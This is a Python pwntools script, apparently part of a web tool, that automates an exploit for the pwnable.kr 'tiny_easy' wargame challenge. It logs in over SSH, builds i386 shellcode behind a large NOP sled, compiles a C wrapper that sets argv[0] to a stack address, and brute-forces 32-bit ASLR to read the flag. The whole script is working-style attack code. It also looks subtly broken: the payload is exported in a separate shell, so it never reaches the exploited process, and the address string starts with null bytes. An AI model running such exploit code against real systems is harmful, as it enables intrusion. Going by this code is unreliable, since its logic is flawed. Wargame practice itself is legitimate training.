from pwn import *
import json
import time

def exploit_tiny_easy(challenge_config):
    """tiny_easy exploit implementation - NOP sled bruteforce"""
    def log(msg):
        yield f"data: {json.dumps({'type': 'log', 'message': msg})}\n\n"
    
    try:
        yield from log("Connecting to pwnable.kr...")
        
        context.log_level = 'error'
        
        s = ssh(host=challenge_config['ssh_host'], 
                port=challenge_config['ssh_port'], 
                user=challenge_config['ssh_user'], 
                password=challenge_config['ssh_pass'])
        yield from log("✓ Connected successfully")
        
        yield from log("Building exploit script on server...")
        
        # Create C wrapper to bypass Python's null byte restriction
        c_wrapper = '''#include <unistd.h>
#include <string.h>

int main() {
    char target[] = "\\x00\\x00\\xb5\\xff";
    char *argv[3];
    argv[0] = target;
    argv[1] = NULL;
    argv[2] = NULL;
    
    execv("/home/tiny_easy/tiny_easy", argv);
    return 1;
}
'''
        
        # Python script to generate shellcode payload
        python_script = '''#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.os = 'linux'

path = b'/home/tiny_easy/flag'
shellcode = asm(shellcraft.i386.linux.cat2(path))

payload = b'\\x90' * 100000 + shellcode

with open('/tmp/payload.bin', 'wb') as f:
    f.write(payload)

print("Payload created")
'''
        
        tmpdir = '/tmp/yael_tiny_' + str(os.getpid())
        s.run(f'mkdir -p {tmpdir}')
        
        # Write Python script
        python_file = tmpdir + '/gen_payload.py'
        with s.sftp.open(python_file, 'w') as f:
            f.write(python_script)
        
        # Generate payload
        yield from log("Generating shellcode payload...")
        s.run(f'python3 {python_file}')
        
        # Write C wrapper
        c_file = tmpdir + '/wrapper.c'
        with s.sftp.open(c_file, 'w') as f:
            f.write(c_wrapper)
        
        # Compile C wrapper
        yield from log("Compiling exploit wrapper...")
        s.run(f'gcc -m32 {c_file} -o {tmpdir}/exploit 2>/dev/null || gcc {c_file} -o {tmpdir}/exploit')
        
        yield f"data: {json.dumps({'type': 'payload', 'payload': 'NOP sled (100000 bytes) + shellcode at 0xffb50000'})}\n\n"
        yield from log("✓ Exploit ready")
        
        yield from log("Exploiting 32-bit ASLR weakness...")
        yield from log("Attempting NOP sled bruteforce...")
        
        # Try the exploit multiple times
        max_attempts = 20
        for attempt in range(1, max_attempts + 1):
            yield from log(f"Attempt {attempt}/{max_attempts}...")
            
            try:
                # Set environment variable with payload
                s.run(f'export PAYLOAD=$(cat /tmp/payload.bin)')
                
                # Run exploit
                result = s.run(f'{tmpdir}/exploit 2>&1', timeout=2)
                output_str = result.decode(errors='ignore').strip()
                
                # Check if we got the flag
                if output_str and len(output_str) > 15 and ('_' in output_str or 'flag' in output_str.lower()):
                    yield from log(f"✓ Success on attempt {attempt}!")
                    
                    # Clean output
                    for line in output_str.split('\n'):
                        line = line.strip()
                        if len(line) > 10 and '_' in line:
                            yield from log("✓ Flag captured!")
                            yield f"data: {json.dumps({'type': 'flag', 'flag': line})}\n\n"
                            break
                    
                    s.close()
                    
                    yield from log("✓ Exploit complete")
                    yield f"data: {json.dumps({'type': 'done'})}\n\n"
                    return
                
            except Exception as e:
                # Expected to crash most of the time
                continue
        
        yield from log("⚠ Maximum attempts reached - try running again")
        s.close()
        
        yield f"data: {json.dumps({'type': 'done'})}\n\n"
        
    except Exception as e:
        import traceback
        yield from log(f"✗ Error: {str(e)}")
        yield f"data: {json.dumps({'type': 'error', 'message': str(e)})}\n\n"